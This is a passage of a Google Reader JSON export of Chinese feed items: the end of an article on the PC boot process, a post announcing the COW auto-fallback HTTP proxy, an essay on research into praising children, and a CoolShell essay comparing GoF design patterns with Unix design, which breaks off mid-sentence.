情况B：扩展分区和逻辑分区</strong></p>\n\n<p>随着硬盘越来越大，四个主分区已经不够了，需要更多的分区。但是，分区表只有四项，因此规定有且仅有一个区可以被定义成\"扩展分区\"（Extended partition）。</p>\n\n<p>所谓\"扩展分区\"，就是指这个区里面又分成多个区。这种分区里面的分区，就叫做\"逻辑分区\"（logical partition）。</p>\n\n<p>计算机先读取扩展分区的第一个扇区，叫做<a href=\"http://en.wikipedia.org/wiki/Extended_partition\">\"扩展引导记录\"</a>（Extended boot record，缩写为EBR）。它里面也包含一张64字节的分区表，但是最多只有两项（也就是两个逻辑分区）。</p>\n\n<p>计算机接着读取第二个逻辑分区的第一个扇区，再从里面的分区表中找到第三个逻辑分区的位置，以此类推，直到某个逻辑分区的分区表只包含它自身为止（即只有一个分区项）。因此，扩展分区可以包含无数个逻辑分区。</p>\n\n<p>但是，似乎很少通过这种方式启动操作系统。如果操作系统确实安装在扩展分区，一般采用下一种方式启动。</p>\n\n<p><strong>3.3 情况C：启动管理器</strong></p>\n\n<p>在这种情况下，计算机读取\"主引导记录\"前面446字节的机器码之后，不再把控制权转交给某一个分区，而是运行事先安装的<a href=\"http://en.wikipedia.org/wiki/Boot_loader#Modern_boot_loaders\">\"启动管理器\"</a>（boot loader），由用户选择启动哪一个操作系统。</p>\n\n<p>Linux环境中，目前最流行的启动管理器是<a href=\"http://en.wikipedia.org/wiki/GNU_GRUB\">Grub</a>。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201302/bg2013021505.png\"></p>\n\n<p><strong>四、第四阶段：操作系统</strong></p>\n\n<p>控制权转交给操作系统后，操作系统的内核首先被载入内存。</p>\n\n<p>以Linux系统为例，先载入/boot目录下面的kernel。内核加载成功后，第一个运行的程序是/sbin/init。它根据配置文件（Debian系统是/etc/initab）产生init进程。这是Linux启动后的第一个进程，pid进程编号为1，其他进程都是它的后代。</p>\n\n<p>然后，init线程加载系统的各个模块，比如窗口程序和网络程序，直至执行/bin/login程序，跳出登录界面，等待用户输入用户名和密码。</p>\n\n<p>至此，全部启动过程完成。</p>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2013/02/booting.html\">http://www.ruanyifeng.com/blog/2013/02/booting.html</a></li>\n<li>最后修改时间：2013年4月 6日 19:20</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><strong>[广告]</strong>　<a href=\"http://ushan.cn?utm_source=ruanyifeng.com\" style=\"border:none\">优衫（Ushan）是国内顶尖的定制西服店，常年为众多政商名流、影视明星、跨国高管定制衬衫与西服。以工艺精良、用料考究、版型出色、性价比高等特点广受各界好评。</a>\n</p>\n</div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1360501593638",
    "timestampUsec" : "1360501593638336",
    "id" : "tag:google.com,2005:reader/item/71c5309e8534e836",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "COW：辅助自动翻墙的 HTTP 代理服务器",
    "published" : 1360479341,
    "updated" : 1362361540,
    "alternate" : [ {
      "href" : "http://www.v2ex.com/t/60208#reply46",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "COW 是一个利用二级代理帮助自动化翻墙的 HTTP 代理服务器。<br>去年暑假开始写的，现在在自己实验室部署着，工作地比较稳定了。<br><br>工作方式很简单，对于没有访问过的网站，默认尝试直接连接，直连失败了用二级代理重试。<br><br>工作时会记录经常访问的网站直连和用二级代理访问的次数，如果被墙次数很多则以后会直接用二级代理。（为避免误判被墙，会随机的再次尝试直连。）<br><br>同时提供 PAC，直连多次都成功的网站会出现在 PAC 中，让客户端绕过代理直接访问。<br><br>支持 socks5, shadowsocks, HTTP 二级代理；支持简单的 ip 和用户名密码认证。<br><br>项目主页 <a href=\"https://github.com/cyfdecyf/cow\">https://github.com/cyfdecyf/cow</a><br><br>欢迎大家试用。<br><br>用 Go 写的，愿意试一下的同学可以去 Google Code 下编译好的二进制文件和配置例子 <a href=\"https://code.google.com/p/cow-proxy/downloads/list\">https://code.google.com/p/cow-proxy/downloads/list</a> 当然也可以安装 Go 自己编译<br><br>配置例子里用中文写了详细的注释，根据自己的情况修改。Windows 上把配置例子和可执行文件放在同一个目录，OS X 和 Linux 把配置文件放在 ~/.cow/rc 即可。"
    },
    "author" : "cyfdecyf",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.v2ex.com/feed/tab/all.xml",
      "title" : "V2EX - 全部",
      "htmlUrl" : "http://www.v2ex.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1360229890854",
    "timestampUsec" : "1360229890854097",
    "id" : "tag:google.com,2005:reader/item/ef228b027e4bd2fd",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "“鼓励教育”该反思了？",
    "published" : 1360596386,
    "updated" : 1360596386,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/436681/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><p><span style=\"line-height:1.6em\">(</span> Po Bronson/文 <span style=\"line-height:1.6em\">）心理学家卡罗•德威克（Carol Dweck）发现，相信“天生智力决定成功”的人会低估努力的重要性。这些人的逻辑是：我很聪明，我不需要努力实践。如果让别人知道了自己是靠努力才获得的成功，那简直就是对天赋的侮辱。</span></p>\n\n<p>德威克曾用10年时间对400名五年级小学生进行实验，发现被夸聪明的孩子更容易放弃、缺乏自信、不敢冒险。后来，她在重复实验时，将每个社会经济阶层都纳入了自己的实验，都发现了同样的结果，不论男女。尤其对最聪明的女孩影响更大（她们在大部分失败的测试中都崩溃了）。连学龄前的孩子也未能幸免于被表扬聪明后带来的负面效应。</p>\n\n<h2 style=\"color:#4ba733;font-size:18px;font-weight:bold\">研究归研究，实践归实践</h2>\n\n<p>吉尔•亚伯拉罕（Jill Abraham）是纽约斯卡斯代尔镇三个孩子的母亲，她的观点很典型。我告诉了她德威克关于表扬的实验，她断然表示对于没有长期跟踪的研究结果不感兴趣。亚伯拉罕相信表扬自己孩子聪明很重要。她觉得自己的孩子成长得很好，所以这就证明了表扬在现实世界中很管用。亚伯拉罕对德威克的研究不以为然：“我不在乎专家怎么说，自己的日子还得自己过。”</p>\n\n<p>而有些人即使接受了这个实验结果，在实践中还是遇到了问题。苏•尼德曼（Sue Needleman）既是两个孩子的妈妈又是一位有着十一年教龄的小学教师。去年，她任教于新泽西帕拉姆斯的山脊牧场小学（Ridge Ranch Elementary），教四年级。她从没听说过卡罗•德威克，但是德威克研究的主旨还是在她的学校贯彻了下来，尼德曼学会对学生说：“我喜欢你不断尝试的劲儿。”她试着把她的表扬具体化，这样孩子就能明确地知道她如何能赢得表扬（从而得到更多表扬）。她偶尔也会告诉孩子“你很擅长数学”，但是她永远也不会对一个孩子说他不擅长数学。</p>\n\n<p>但是这只发生在学校，尼德曼只有作为教师时才会这么做。在家里，她还是积习难改。她八岁的女儿和五岁的儿子倒也确实聪明，她会对他们说：“你真棒。你做到了。你好聪明。”当我给尼德曼讲了德威克的研究后，尼德曼说这些学术研究总是令人感觉不现实。“我读这些模拟的对话的第一反应是：‘哦，拜托，太假了！’”</p>\n\n<h2 style=\"color:#4ba733;font-size:18px;font-weight:bold\">改变\"三观“也能提高成绩</h2>\n\n<p>在纽约东哈莱姆区（East Harlem）生命科学中学任教的教师就不存在这种疑虑，因为他们已经在高中生身上亲身实践了德威克的理论。上周，德威克和她的学生丽莎•布莱克维尔（Lisa Blackwell），在《儿童发展》（Child Development）上发表了一个研究，探究了一个学期的干预对于改善学生数学成绩的效果。</p>\n\n<p>生命科学中学是一所著名的重点中学，却拥有700名少数裔族和低水平学生。布莱克维尔把她的学生分成两组参加了一个有8期课程的工作坊。控制组接受学习技能培训，实验组除了要接受学习技能培训，还要学习“大脑发展观”——智力不是天生的。这些学生轮流大声朗读一篇关于大脑在挑战下如何长出新的神经元的文章、看关于大脑的幻灯片并且排演短剧。</p>\n\n<p>“就连我在教授这些知识时，也还是能听到学生们开玩笑叫对方‘笨蛋’或者‘傻冒’。”所以布莱克维尔教授“大脑发展观”后，查看了学生的分数，想知道这么做到底有没有效。</p>\n\n<p>不久，即使不知道哪些学生分到了哪个组，老师们仍然可以挑出那些学习过“大脑发展观”的学生，因为他们改善了自己的学习习惯,提高了成绩。布莱克维尔用一个学期挽救了学生日益下降的数学成绩。<br>\n实验组和控制组唯一的不同就是两节总共加起来50分钟的课。这50分钟不教数学，只教一个观念：大脑像肌肉，努力练习就能使你更聪明。仅这点就可以改善学生的数学成绩。</p>\n\n<p>哥伦比亚大学儿童拒绝敏感度专家杰拉尔丁•唐尼（Geraldine Downey）博士点评道：“这是很有说服力的发现。这个研究表明了你如何建立一套自己的‘三观’，从而影响你的人生的。”同领域其他学者对于唐尼的点评颇有同感。哈佛大学研究刻板印象的社会心理学家马泽瑞•班尼基（Mahzarin Banaji）博士告诉我说：“卡罗•德威克是个很有干劲的天才。我希望这个研究被严肃对待。它的结果会让人吓一跳的。”</p>\n\n<h2 style=\"color:#4ba733;font-size:18px;font-weight:bold\">“鼓励教育”该反思了？</h2>\n\n<p>心理学家纳撒尼尔•布兰登（Nathaniel Branden）认为自尊（自我评价的高低。——编者注）是一个人的最重要的方面，自从1969年《自尊心理学》（The Psychology of Self-Esteem）发表了他的这一观点后，不遗余力地帮助人们提高自我评价变成了一场广泛的社会运动。任何潜在损害孩子自我评价的事情都被禁止了。竞争变得令人难以接受。足球教练不再计算进球，转而给每个人发奖品。教师扔掉了红色铅笔。批评被无处不在的，甚至名不副实的表扬所取代。</p>\n\n<p>“表扬、自尊和表现同起同落”曾是心理学界的主流观点，但现在正在经受大规模的挑战，德威克和布莱克维尔的研究正是这些挑战当中的一个。从1970年到2000年，有超过15000篇有关自尊的学术论文，涉及到从性到职业发展等等任何事情。但是结果多是矛盾或结论不明的。因此，从2003年起，美国心理学大会（APS）就邀请著名心理学家罗伊•鲍迈斯特（Roy Baumeister）领导对自尊研究进行综合审查，发起了“反自尊”运动。他的团队发现，自尊被不严谨的科学研究污染了。这15000篇论文中只有200篇可以达到严格的科学论文标准。</p>\n\n<p>审查了这200篇研究之后，鲍迈斯特发现高自尊并不能改善成绩和职业成就，甚至都不能减少酒精滥用，也没有降低各类犯罪（高攻击性的人恰恰自恃甚高，这就批驳了人们通过表现得具有攻击性来弥补低自尊的理论）。鲍迈斯特甚至把这当做“职业生涯中最失望的时刻”。</p>\n\n<p>现在鲍迈斯特和德威克站在了一边，他们的研究颇为相似。不久鲍迈斯特就会发表一篇论文揭示通过表扬建立自信的方法使面临挂科危险的大学生的成绩更差。鲍迈斯特发现，孩子的成就让父母骄傲， “表扬孩子就是表扬父母自己。”</p>\n\n<p>过往的研究普遍认为表扬是有积极激励作用的。比如圣母大学的一个研究，测试了表扬对于输球的大学冰球队的影响。实验成功了，因为这个队伍最终进了季后赛。但是德威克则认为，这并不能说明表扬都具有积极作用，因为表扬和表扬是不同的。效果会因为表扬的具体内容和形式而产生天壤之别。研究者发现，只有当表扬很具体时才有效。在圣母大学的这个研究中，表扬的刚好是冰球队员成功拦截对手的次数。</p>\n\n<p>真诚在表扬中也同样重要。就像我们可以嗅出讽刺挖苦的评价或者不真诚的道歉一样，孩子也审视着表扬背后隐藏的意思。只有不到7岁的孩子才按表面意思理解表扬。大点儿的孩子和成年人一样多疑。</p>\n\n<p>这个领域里的另一位开拓者，心理学家沃尔夫-乌维•迈耶（Wulf-Uwe Meyer）做了一系列实验揭示孩子在看其他孩子受表扬时的表现。根据迈耶的发现，12岁的儿童认为老师表扬你并不是你做得好，实际上表明了你能力不足，老师认为你需要额外的鼓励。而在青少年中，迈耶发现，学生觉得表扬不值钱，老师夸你实际上是抱有积极态度的批评。</p>\n\n<p>认知科学家丹尼尔•威林厄姆（Daniel T. Willingham）的观点认为老师表扬孩子可能不知不觉地传达了学生本身能力不足的讯息，而老师批评学生则表达了他可以进步的意思。</p>\n\n<p>纽约大学的精神病学教授朱迪斯•布鲁克（Judith Brook）解释说问题的关键是表扬的可信性。“表扬很重要，但不能空洞，必须基于一些真实的事情——一些孩子们的技能和天赋。”一旦孩子认为得到的表扬是无根据的，他们就不论这表扬是由衷的还是不由衷的一律大打折扣。</p>\n\n<p>来自里德学院和斯坦福大学的学者综合审查了150个关于表扬的研究。他们的元分析（元分析和下文中的“相关分析”都是统计方法。——编者注）结果显示被表扬的学生变得更倾向于规避风险和缺乏独立精神。学者通过相关分析发现，口头表扬越多，学生坚持任务的时间更短；会经常用眼神像老师寻求肯定；用带有询问语气做出含糊不定的回答。</p>\n\n<p> </p>\n\n<p><strong>编辑的话</strong> ：用“胡萝卜加大棒”塑造行为，不仅是家长代代相传的方法，更被行为心理学家发展到了极致，但每次好行为之后都得到奖励，就可以培养出好习惯吗？当奖励不足或没有奖励时，该怎么办？请继续阅读《 <a href=\"http://www.guokr.com/article/436678/\">过度奖励，削弱孩子意志力的“糖衣炮弹”</a> 》《 <a href=\"http://www.guokr.com/article/436678/\">不适当的表扬吞噬“神童”的自信</a> 》。</p>\n\n<p>本文编译自《纽约》（New York）How Not to Talk to Your Kids-The inverse power of praise. <span style=\"line-height:1.6em\"> </span></p></div><img src=\"http://analytics.guokr.com/ga.gif?utmp=/article/436681/&amp;utmac=UA-19521615-11&amp;cookie_name=utmrss&amp;guid=on&amp;utmn=1196625087\">"
    },
    "author" : "VeraTulips",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1359691846097",
    "timestampUsec" : "1359691846097328",
    "id" : "tag:google.com,2005:reader/item/7f53a85337575645",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Unix/Linux", "杂项资源", "程序设计", "Design", "design pattern", "Object-Oriented", "Unix" ],
    "title" : "从面向对象的设计模式看软件设计",
    "published" : 1359677759,
    "updated" : 1359677759,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/8961.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>前些天发了一篇《<a title=\"如此理解面向对象编程\" href=\"http://coolshell.cn/articles/8745.html\" rel=\"bookmark\">如此理解面向对象编程</a>》的文章，然后引起了大家的热议。然后我在<a href=\"http://weibo.com/1401880315/z9wWHrrVR\">微博上说</a>了一句——“<strong>那23个经典的设计模式和OO半毛钱关系没有，只不过人家用OO来实现罢了……OO的设计模式思想和Unix的设计思想基本没什么差别</strong>”，结果引来了一点点争议。所以，我写下这篇文章把我的观点说明一下。我希望这样可以让大家更容易地理解什么是设计模式。<strong>我顺便帮OO和 Unix/Linux搞搞基</strong>。</p>\n<h4>什么是模式</h4>\n<p>在正式说明GoF的那23个经典的设计模式其实和OO关系不大并和Unix的设计思想很相似的这个观点之前，让我先来说说什么是模式？设计模式的英文是Design Pattern，模式是Pattern的汉译。所谓Pattern就是一种规则，或是一种模型，或是一种习惯。Pattern这个东西到处都是，并不只有技术圏子里才有。比如：</p>\n<ul>\n<li>文章有文章的Pattern。如新闻有新闻的Pattern（第一段话简述了整个新闻），诗歌总是抒情的，论文总是死板的，讲稿总是高谈的，漫画总是幽默的，……</li>\n<li><span style=\"line-height:13px\">小说有小说的Pattern。比如，</span>\n<ul>\n<li><span style=\"line-height:13px\">武侠小说必然要整个武林大会，整几个NB的武功和大师，分个正派和反派，还有一个或数个惊天阴谋，坏人总是要在一开始占尽优势，好人总是要力挽狂澜……</span></li>\n<li><span style=\"line-height:13px\">言情小说总是要有第三者，总是要有负心人，里面的女子总是要哭得死去活来，但又痴心不改，……</span></li>\n</ul>\n</li>\n<li> 新闻联播的模式是：头10分钟领导很忙，中间10分钟人民很幸福，后10分钟国外很乱。中国政府官方宣传稿也模式也很明显，各种赞美，口号，胜利，总是要坚持个什么，团结个什么，迈向个什么，某某精神，某某思想，群众情绪稳定，不明真相，等等……</li>\n<li>春节的模式是，回家，吃饺子，放个鞭炮，给压岁钱，同学聚会…… 同学聚会的模式基本上都是在饭桌上回忆一下校园时光，比较一下各自的当前处境，调戏一下女同学……</li>\n<li>…… ……</li>\n</ul>\n<p>这就是Pattern，只要你细心观察，你会发现这世间有很多很多的Pattern。</p>\n<p><span></span></p>\n<h4>GoF的23个设计模式</h4>\n<p>《<a href=\"http://product.china-pub.com/25961\">设计模式</a>》这本书中，GoF这四个人总结了23个经典的面向对象的设计模式，某中有5个创建模式，7个结构模式，11个行为模式。<strong>很多人都会觉得这是面向对象的设计模式，很多人也觉得非面向对象不能用这些模式。我觉得这是一种教条主义。</strong>就像《<a title=\"各种流行的编程风格\" href=\"http://coolshell.cn/articles/2058.html\">那些流行的编程方法</a>》中的“设计模式驱动型编程”一样，就像《<a title=\"如此理解面向对象编程\" href=\"http://coolshell.cn/articles/8745.html\">如此理解面向对象</a>》一样的那么的滑稽。</p>\n<p>好了，回到我的论点——“<strong>GoF的这23个设计模式和OO关系不大，并且和Unix的设计思想基本一致，只不过GoF用OO实现了它们</strong>”，就像我上面说过的那些生活中的Pattern一样，只要你仔细思考，你会发现这23个设计模式在我们的生活和社会中也能有他们的身影。而且也一样可以用OO的方式实现之。</p>\n<p>让我们来看看这23个经典的设计模式中的几个常用的模式：</p>\n<p><strong>Factory 模式</strong>，这个模式可能是是个人都知道的模式。这个模式在现实社会中就像各种工厂一样，工厂跨界的不多，基本上都是在生产同一类的产品，有的生产汽车，有的生产电视，有的生产衣服，有的生产卫生纸……基本上来说，一个生产线上只有做同一类的东西。这和Factory模式很相似。编程中，像内存池，线程池，连接池等池化技术都是这个模式，当然，Factory给你的一个对象，而不单单只是资源，factory创建出来的对象都有同样的接口可以被多态调用。<strong>这其实和Unix把所有的硬件都factory成文件一样，并提供了read/write等文件操作来让你操作任意设备的I/O</strong>。</p>\n<p><strong>Abstract Factor</strong>y：抽象工厂这个模式是创建一组有同一主题的不同的类。这个模式在现实社会当中也有很多例子，比如：</p>\n<ul>\n<li>移动公司的合约机计划，88套餐（通话100分钟，短信100条，彩信，20条，上网200M），128套餐（通话200分钟，短信150条，彩信50条，上网500M）……</li>\n</ul>\n<ul>\n<li>家里的装修，总是要有厨卫，有门，有灯，有沙发，有茶几，有床，有衣柜，有电视，有冰箱，有洗衣机……，这些都是必需的，只是每个家庭里的具体装修不一样。</li>\n</ul>\n<ul>\n<li>Diablo游戏中的Normal，Hard，Nightmare，Hell模式，这些模式的怪和场景和故事情况都差不多，就是每个场景的怪物和装备的属性不一样。或是WarCraft中的地图就是一个Abstract Factory模式(注：Warcraft的地图什么都能干)。这和学校中的小学，初中，高中，大学差不多，都是一样的学习环境，一样的教学方式，一样的教室，都要期中考和期末考，都有班长和科代表，就是学的东西的难度不一样，但基本上都是语文，英语，数，理，化，还有永远都有的政治课。学校就是一个抽象工厂。</li>\n</ul>\n<p>这就是抽象工厂的业务模型（或是：Business Pattern），你觉得是不是不一定非要用OO来实现这样的模式？（我们思考一下，我们会不会被先入为主了，觉得不会OO都不知道怎么实现了），不用OO，用相同格式但内容不同的配置文件是不是也能实现？在Unix下<strong>，抽象工厂这个模式在Unix下就像是/etc/rcX.d下的那些东西，1代表命令行单用户，2，代表命令行多用户，3代表命令行多用户完整模式启动，5代表图形界面启动，0代表关机，6代表重启，你要切换的话，init &lt;X&gt;就行了</strong>。</p>\n<p><strong>Prototype模式</strong>，原型模式，复制一个类的实现。这个模式在现实中的例子也有很多：传真，复印，都是这个模式。<strong>Unix进程和Github项目的Fork就是一种。进程fork明显不是OO的模型</strong>（参看：<a title=\"一个fork的面试题\" href=\"http://coolshell.cn/articles/7965.html\">关于Fork的一道面试题</a>）。用非OO的方法同样可以实现这个模式。</p>\n<p><strong>Singleton模式</strong>，单例模式。生活中，公司只有一个CEO，法律限制你只能有一个老婆，你只能有一个身份证号，一个TCP端口只能被一个进程使用，等等。软件开发方面，并不一定只有OO才能做到，你可以用一个全局变量，一个中心服务器，甚至可以使用行政手段来约束开发中不会出现多个实例。<strong>Unix下实现单例进程的一个最常用的实践是在进程启动的时候用“(S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)”模式打开一个“锁文件”</strong>。</p>\n<p><strong>Adapter模式</strong>，适配器模式。可以兼容欧洲美国中国的插头或插座，万能读卡器，可以播放各种格式多媒体文件的插放器，可以解析FTP/HTTP/HTTPS/等网络协议的浏览器，可以兼容各大银行的银联接口、支付宝、Paypal、VISA等银行接口，可以适配各种后端的解释器的Nginx或Apache，等等。用非OO的编程方式就是重新包装成一个标准接口。<strong>这个模式很像Unix下的/dev下的那些文件，操作系统把系统设备适配成文件，于是你就可以使用read/write来进行读写了</strong>。</p>\n<p><strong>Bridge模式</strong>，桥接模式。这个模式用的更多，比如一个灯具可以接各种灯泡或灯管，一个电钻可以换上不同的钻头来适应不同的材料，一辆汽车可以随时更换不同的轮胎来适应不同的路面，你的桌面可以随时更换一个图片来适应你的心情，你的单反相机可以更换不同的镜头来拍不同的照片…… 桥接模式说白了就是组件化，模块化，可以自由拼装。在OO中，其主要是通过让业务类组合一个标准接口来完成，这在非OO的程序设计中用得实在是太多了，主要是通过回调函数或是标准接口来实现。这个也是Unix设计哲学中的主要思想。<strong>在Unix中，文件的权限使用的就是Bridge模式，标准接口是用户，用户组和其它，rwx三个模式，然后用 chmod/chown改一改，这文件就有不同的属主和属性了</strong>。</p>\n<p><strong>Decorator模式</strong>，装饰模式。这个模式在生活中太多了，你给你的手机或电脑贴个什么，挂个什么，吃东西的时候加点什么佐料，多点肉还是多个蛋，一个Unix/Linux命令的各种参数是对这个命令的修饰，等等。<strong>我觉得这个模式在Unix中最经常的体现就是通过管道把命令连接起来来完成一个功能</strong>，比如：ps -elf  是列进程的，用管道 grep hchen就可以达到过滤的目的，grep的逻辑没有侵入ps中，grep 修饰了 ps，但是其组合起来完成了一个特定的功能。可见，这和OO没有什么关系。</p>\n<p><strong>Facade模式，</strong>这个模式我们每个人从会编程的时候就在无意识地用这个模式了。这个模式就是把一大堆类拼装起来，并统一往外提供提口。在现实生活中这样的例子太多了，比如：旅行社把机票，酒店，景点，导游，司机，进店打了一个包叫旅行；IBM把主机，存储，OS，J2EE，DB，网络，流程打了个包叫企业级解决方案。Unix中最典型的一个例子就是用Shell脚本组合各种命令来创造一个新的功能，这是的Shell中的各种命令通过标准I/O这个接口进行组合交互。</p>\n<p><strong>Proxy模式</strong>，代理模式。我们租个房，买个机票，打个官司，都少不了代理，人大代表代理了老百姓去行使政治权力。我们去饭馆里吃饭也是一种代理模式，因为我们只管吃就好了，洗菜做饭洗碗的工作都被Proxy帮你干了，于是你就省事多了。操作系统就是硬件的代理，CDN就是网站的代理，……使用代理你可以让事情变理更简单，也可以在代理层加入一些权限检查，这样可以让业务模块更关注业务，而把一些非业务的事情剥离出来交给代理以完成解耦。可见这个模式和OO没啥关系。<strong>Unix下这个模式最佳体现就是Shell，它代理了系统调用并提供UI</strong>。还有很多命令会帮你把/proc目录下的那些文件内容整理和显示出来。</p>\n<p><strong>Chain of Responsibility模式</strong>，劫匪来抢银行，保安搞不定，就交给110，110搞不定就交给武警。有什么事件发生时的响应的Escalation Path，办公中的逐级审批。这个模式用一个函数指针数组或是栈结构就可以实现了。这个思想很像编程中的异常处理机制，一层一层地往上传递异常直到异常被捕捉。<strong>在Unix下，一个最简单的例子就是用 &amp;&amp; 或 || 来把命令拼起来，如：cmd1 &amp;&amp; cmd2  或 cmd3 || cmd4 ， 如果cmd1失败了，cmd2就不会执行，如果cmd3失败了，cmd4才会执行。</strong>如： cd lib &amp;&amp; rm -rf .o 或 ping -c1 coolshell.cn &amp;&amp; ssh haoel@coolshell.cn</p>\n<p><strong>Command模式</strong>，这恐怕是软件里最多的模式了，比如：编译器里的Undo/Redo，宏录制。还有数据库的事务处理，线程池，设置向导，包括程序并行执行的指令集等等。这个模式主要是把一个对象的行为封装成一个一个的有相同接口的command，然后交给一个统一的命令执行器执行或管理这些命令。<strong>这个模式和我们的Unix/Linux机器启动时在/etc/init.d下的那些S和K开头的脚本很像，把各种daemon的启动和退出行为封装成一个脚本其支持reload/start/stop/status这样的命令，然后把他们按一定的规范做符号链接到/etc/init.d目录下，这样操作系统就会接管这些daemon的启动和退出</strong>。</p>\n<p><strong>Observer模式</strong>，观察者模式，这个模式也叫pub-sub模式，很像我们用手机订阅手机报，微博的follow的信息流也是这样的一个模式。MVC中的C会sub V中的事件，用非OO的方式其实也是一个回调函数的事。在很多异步系统中，你需要知道最终的调用有没有成功，比如说调用支付宝的支付接口，你需要向支付宝注册一个回调的接口，以便支付宝回调你。<strong>Linux下的一些系统调用如epoll/aio/inotify/signal都是这种思路</strong>。</p>\n<p><strong>Strategy 模式</strong>，策略模式，这个模式和Bridge模式很像，只不过Bridge是结构模式，其主要是用于对象的构造；而Strategy是行为模式，主要是用于对象的行为。策略模式很像浏览器里的各种插件，只要你装了某个插件，你就有某个功能。你可以安装多个插件来让你的浏览器有更多的功能（书本上的这个模式是你只能选用一个算法，当然，我们不用那么教条）。<strong>就像《<a title=\"你可能不知道的Shell\" href=\"http://coolshell.cn/articles/8619.html\">你可能不知道的Shell</a>》中的那个设置设置$EDITOR变量后可以按ctrl+x e启动编译器，或是用set -o vi或set -o emacs 来让自己的shell像vi或 emacs 一样，或是像find -exec或xargs一样的拼装命令</strong>。</p>\n<p><strong>Bridge 和 Strategy是OO设计模式里的“Favor Composition Over Inheritance” 的典范，其实现了接口与实现分离的</strong>。Unix中的Shell就是一种，你可随意地更换不同的Shell。还有Emacs中的LISP驱动C，C实现了引擎，交给LISP实现逻辑。把程序分为前端和后端，通过socket专用应用协议进行通讯，前端实现策略，后端实现机制。再看看makefile把编译器和源代码的解耦，命令行输出这个接口可以把一个复杂的功能解耦并抽像成各种各样小而美的小功能命令，等等这样的例子，你会发现，还有大量的编程框架都会多少采用这样的思想，可以让你的软件像更换汽车零件一样方便。我在用<a title=\"用Unix的设计思想来应对多变的需求\" href=\"http://coolshell.cn/articles/7236.html\">Unix的设计思想来应对变更的需求</a>中说过灯具厂，灯泡厂，和开关厂的例子。</p>\n<h4>后记</h4>\n<p>因为写作仓促，上面的那些东西，可能会你让你觉得有些牵强，那么抱歉了，你可以帮我看看在生活中和 Unix里有没有更帅的例子。</p>\n<p>不过，我们会发现上面OO搞出来的那么多模式在Unix下看来好像没有那么复杂，而且Unix下看起来并没有那么多模式，而且Unix中的设计模式无非就是这么几个关键词：<strong>单一，简洁，模块，拼装</strong>。我们再来看看OO设计的两大准则：<strong>1）钟情于组合而不是继承，2）依赖于接口而不是实现</strong>。还有S.O.L.I.D原则也一样（如果你仔细观察，你会发现SOLID原则在Unix下也是完美地体现）。你看，Unix和OO设计模式是不是完美的统一吗？</p>\n<p>我有种强烈的感觉——<strong>Unix对这些所谓的OO的设计模式实现得更好</strong>。因为Unix就一条设计模式！再次推荐《<em><a href=\"http://book.douban.com/subject/5387401/\">The Art of Unix Programming</a></em>》</p>\n<p><img alt=\"Unix Kiss\" src=\"http://coolshell.cn//wp-content/uploads/2013/01/kiss.png\" width=\"468\" height=\"219\"></p>\n<h4>餐后甜点</h4>\n<p>我上面提到了《<em><a href=\"http://book.douban.com/subject/5387401/\">The Art of Unix 